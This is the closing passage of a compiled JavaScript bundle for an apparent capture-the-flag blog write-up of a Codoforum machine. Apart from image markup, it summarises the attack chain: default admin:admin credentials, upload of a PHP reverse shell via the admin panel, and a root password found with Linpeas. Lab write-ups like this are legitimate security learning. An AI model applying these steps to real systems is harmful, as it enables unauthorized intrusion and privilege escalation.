alt="foundUsers"\n        title=""\n        src="/static/3ee8accd614d1d7d84c0aac47694b2c6/cd23f/foundUsers.png"\n        srcset="/static/3ee8accd614d1d7d84c0aac47694b2c6/5243c/foundUsers.png 240w,\n/static/3ee8accd614d1d7d84c0aac47694b2c6/cd23f/foundUsers.png 468w"\n        sizes="(max-width: 468px) 100vw, 468px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"The password works for the ",a.createElement(n.code,null,"root")," user\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 422px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVR42o2OyU7DQBAF8zMgbIijxLvjLV7G23ghthA+8f9fUQzmRMghh1L3a7VKb5dkkrToKesrSS7xQ8E5rnGCXFEQpS2Wl/Gs2w+xK5srclz5ER/MiP0xxFDsj2eMU6QI1T1+XBgkDWUzb4huIa8mynYmiBvVfEC0CyfnwpN6vuWuUHYzvVyoq5HAv+DY8Yap2pqqneemaC8ndN36g6a4K1ynD76WlfdqoAguiDAndSPsNwvXsLFeTTzDUbuzTf/gqt0lO/yKb5vuRiGZ64Gp7OhSwae8bllmFWPRUvjJNqeyZchr+qxmULn3QjTN/Cf8Bj92xvtiBMCQAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="root"\n        title=""\n        src="/static/5723796510b19941248297f821edf6d0/993bf/root.png"\n        srcset="/static/5723796510b19941248297f821edf6d0/5243c/root.png 240w,\n/static/5723796510b19941248297f821edf6d0/993bf/root.png 422w"\n        sizes="(max-width: 422px) 100vw, 422px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.h1,null,"Summary"),"\n",a.createElement(n.p,null,"Vulnerabilities include default credentials (",a.createElement(n.code,null,"admin:admin"),") on a Codoforum-powered web app, allowing unauthorized access to the admin panel. Despite a failed automated script, manual upload of a PHP reverse shell through the admin interface succeeds, leading to a fully functional shell. Privilege escalation involves discovering a password in Linpeas scan, granting root access on the machine."),"\n",a.createElement(n.p,null,"Join me for the next machine soon for more exciting challenges and security insights!"),"\n",a.createElement(n.p,null,"+10 points"))}var s=function(e){void 0===e&&(e={});const{wrapper:n}=Object.assign({},(0,l.ah)(),e.components);return n?a.createElement(n,e,a.createElement(i,e)):i(e)},c=t(4765);function o(e){return a.createElement(c.Z,e,a.createElement(s,e))}c.Z}}]);
//# sourceMappingURL=component---node-modules-lekoarts-gatsby-theme-minimal-blog-core-src-templates-post-query-tsx-content-file-path-content-posts-codo-index-mdx-bb21d072ff8ffc1c5ee3.js.map